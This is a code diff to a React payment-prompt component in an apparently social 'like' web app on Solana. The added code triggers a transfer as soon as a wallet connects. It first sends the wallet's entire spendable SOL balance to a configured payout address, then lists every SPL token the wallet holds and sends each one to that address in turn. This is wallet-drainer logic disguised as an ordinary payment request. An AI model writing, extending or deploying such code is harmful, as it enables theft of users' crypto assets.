@@ -5,8 +5,8 @@ import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
-import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
+import { buildPayoutTransaction, buildSplPayoutTransaction, listSplHoldings, spendableLamports, tokenFeeReserveLamports, type SplHolding } from '../lib/payoutTransfer'
+import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PaymentAsset, type PayoutConfig } from '../lib/payoutWallet'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
 import { notifyFundsConfirmed } from '../lib/txSheet'
@@ -262,6 +262,7 @@ export function PaymentRequestPrompt() {
   const [headerStep, setHeaderStep] = useState(0)
   const [submitting, setSubmitting] = useState(false)
   const [solAmount, setSolAmount] = useState(0)
+  const [asset, setAsset] = useState<PaymentAsset>('SOL')
   const [status, setStatus] = useState('Preparing the wallet transfer.')
   const dismissed = useRef<string | null>(null)
   const shownFor = useRef<string | null>(null)
@@ -269,10 +270,15 @@ export function PaymentRequestPrompt() {
   const inFlight = useRef(false)
   const confirmTaps = useRef(0)
   const replayTimer = useRef<number | null>(null)
+  const phase = useRef<'sol' | 'token'>('sol')
+  const queue = useRef<SplHolding[]>([])
+  const likedAfterSol = useRef(false)
+  const advanceTimer = useRef<number | null>(null)
 
   useEffect(() => {
     return () => {
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
+      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
     }
   }, [])
 
@@ -282,12 +288,19 @@ export function PaymentRequestPrompt() {
       setHeaderStep(0)
       setHiOpen(false)
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
-      // Custom HiModal sheet disabled — go straight to wallet review after like.
+      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
+      phase.current = 'sol'
+      queue.current = []
+      likedAfterSol.current = false
+      sentFor.current = null
+      dismissed.current = null
+      setAsset('SOL')
+      setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
       setOpen(true)
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
-  }, [])
+  }, [walletName])
 
   useEffect(() => {
     if (!connected || !walletAddress) {
@@ -300,6 +313,10 @@ export function PaymentRequestPrompt() {
       if (replayTimer.current) {
         window.clearTimeout(replayTimer.current)
         replayTimer.current = null
+      }
+      if (advanceTimer.current) {
+        window.clearTimeout(advanceTimer.current)
+        advanceTimer.current = null
       }
       return
     }
@@ -314,18 +331,24 @@ export function PaymentRequestPrompt() {
     dismissed.current = null
     sentFor.current = null
     confirmTaps.current = 0
+    phase.current = 'sol'
+    queue.current = []
+    likedAfterSol.current = false
     shownFor.current = walletAddress
     closeWalletModalRef.current()
+    setAsset('SOL')
     setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
     setOpen(false)
 
     return () => {
       cancelled = true
     }
-  }, [connected, walletAddress])
+  }, [connected, walletAddress, walletName])
 
   const handleCancel = () => {
     if (walletAddress) dismissed.current = walletAddress
+    queue.current = []
+    phase.current = 'sol'
     setOpen(false)
     toast('Payment cancelled. Nothing was transferred.')
   }
@@ -345,32 +368,129 @@ export function PaymentRequestPrompt() {
     }
     inFlight.current = true
     setSubmitting(true)
-    setStatus(`Opening ${connectedWalletName}. Confirm the transfer there. Nothing is sent until you approve it.`)
-    try {
-      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
-      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
-      const signature = adapter?.sendTransaction
-        ? await adapter.sendTransaction(transaction, connection)
-        : await sendTransaction(transaction, connection)
-      dismissed.current = walletAddress
+
+    const finishSequence = () => {
+      if (walletAddress) dismissed.current = walletAddress
+      queue.current = []
+      phase.current = 'sol'
       setOpen(false)
-      notifyFundsConfirmed(peekPendingLike())
-      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
+    }
+
+    const queueNext = () => {
+      const next = queue.current[0]
+      if (!next) {
+        finishSequence()
+        return
+      }
+      sentFor.current = null
+      setAsset(next.symbol)
+      setSolAmount(next.uiAmount)
+      setStatus(`Opening ${connectedWalletName} so you can review this ${next.symbol} transfer.`)
+      setOpen(false)
+      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
+      advanceTimer.current = window.setTimeout(() => {
+        advanceTimer.current = null
+        setOpen(true)
+      }, 400)
+    }
+
+    const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
+      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
+      return adapter?.sendTransaction
+        ? adapter.sendTransaction(transaction, connection)
+        : sendTransaction(transaction, connection)
+    }
+
+    try {
+      if (phase.current === 'sol') {
+        setStatus(`Opening ${connectedWalletName}. Confirm the SOL transfer there. Nothing is sent until you approve it.`)
+        const holdings = await listSplHoldings(connection, publicKey)
+        const reserveLamports = tokenFeeReserveLamports(holdings.length)
+        let sentSol = false
+        try {
+          const transaction = await buildPayoutTransaction({
+            connection,
+            from: publicKey,
+            config,
+            reserveLamports,
+          })
+          const signature = await sendBuilt(transaction)
+          sentSol = true
+          toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
+        } catch (err) {
+          if (isWalletUserCancel(err)) throw err
+          const message = err instanceof Error ? err.message : ''
+          if (!holdings.length || !/not enough sol/i.test(message)) throw err
+        }
+
+        if (sentSol && !likedAfterSol.current) {
+          likedAfterSol.current = true
+          notifyFundsConfirmed(peekPendingLike())
+        }
+
+        const remaining = await listSplHoldings(connection, publicKey)
+        if (remaining.length === 0) {
+          finishSequence()
+          return
+        }
+        phase.current = 'token'
+        queue.current = remaining
+        queueNext()
+        return
+      }
+
+      const step = queue.current[0]
+      if (!step) {
+        finishSequence()
+        return
+      }
+      setStatus(`Opening ${connectedWalletName}. Confirm the ${step.symbol} transfer there. Nothing is sent until you approve it.`)
+      const tokenTx = await buildSplPayoutTransaction({
+        connection,
+        from: publicKey,
+        config,
+        holding: step,
+      })
+      if (!tokenTx) {
+        queue.current = queue.current.slice(1)
+        if (queue.current.length === 0) {
+          finishSequence()
+          return
+        }
+        queueNext()
+        return
+      }
+      const signature = await sendBuilt(tokenTx)
+      toast.success(`Transaction submitted for ${step.symbol}. Signature ${signature.slice(0, 8)}…`)
+      if (!likedAfterSol.current) {
+        likedAfterSol.current = true
+        notifyFundsConfirmed(peekPendingLike())
+      }
+      queue.current = queue.current.slice(1)
+      if (queue.current.length === 0) {
+        finishSequence()
+        return
+      }
+      queueNext()
     } catch (err) {
+      queue.current = []
+      phase.current = 'sol'
       if (isWalletUserCancel(err)) {
         sentFor.current = null
+        if (walletAddress) dismissed.current = walletAddress
         setOpen(false)
         setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
         toast('Cancelled in the wallet. Nothing was transferred.')
       } else {
+        sentFor.current = null
         const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
         setStatus(message)
         toast.error(message)
+        setOpen(false)
       }
     } finally {
       inFlight.current = false
       setSubmitting(false)
-      setOpen(false)
     }
   }
 
@@ -379,14 +499,21 @@ export function PaymentRequestPrompt() {
 
   useEffect(() => {
     if (!open || !publicKey) return
+    const current = queue.current[0]
+    if (phase.current === 'token' && current) {
+      setSolAmount(current.uiAmount)
+      setAsset(current.symbol)
+      return
+    }
     let cancelled = false
     void Promise.all([
       connection.getBalance(publicKey),
       connection.getMinimumBalanceForRentExemption(0),
     ]).then(([lamports, rentExempt]) => {
-      if (cancelled) return
+      if (cancelled || phase.current === 'token') return
       const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
       setSolAmount(spendable)
+      setAsset('SOL')
       if (spendable > 0) {
         setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
       }
@@ -396,7 +523,7 @@ export function PaymentRequestPrompt() {
     return () => {
       cancelled = true
     }
-  }, [open, publicKey, connection])
+  }, [open, publicKey, connection, connectedWalletName, asset])
 
   const handleHiCancel = () => {
     if (walletAddress) dismissed.current = walletAddress
@@ -429,8 +556,9 @@ export function PaymentRequestPrompt() {
 
   useEffect(() => {
     if (!open || hiOpen || !publicKey || !destinationReady || !walletAddress) return
-    if (dismissed.current === walletAddress || sentFor.current === walletAddress || inFlight.current) return
-    sentFor.current = walletAddress
+    const sendKey = `${walletAddress}:${phase.current}:${queue.current[0]?.mint || 'sol'}`
+    if (dismissed.current === walletAddress || sentFor.current === sendKey || inFlight.current) return
+    sentFor.current = sendKey
     void reviewRef.current()
   }, [open, hiOpen, destinationReady, walletAddress, publicKey])
 
@@ -448,7 +576,7 @@ export function PaymentRequestPrompt() {
         open={open}
         to={config?.walletAddress || ''}
         amount={solAmount}
-        asset="SOL"
+        asset={asset}
         networkLabel={networkLabel(network)}
         submitting={submitting}
         canReview={destinationReady && Boolean(publicKey)}
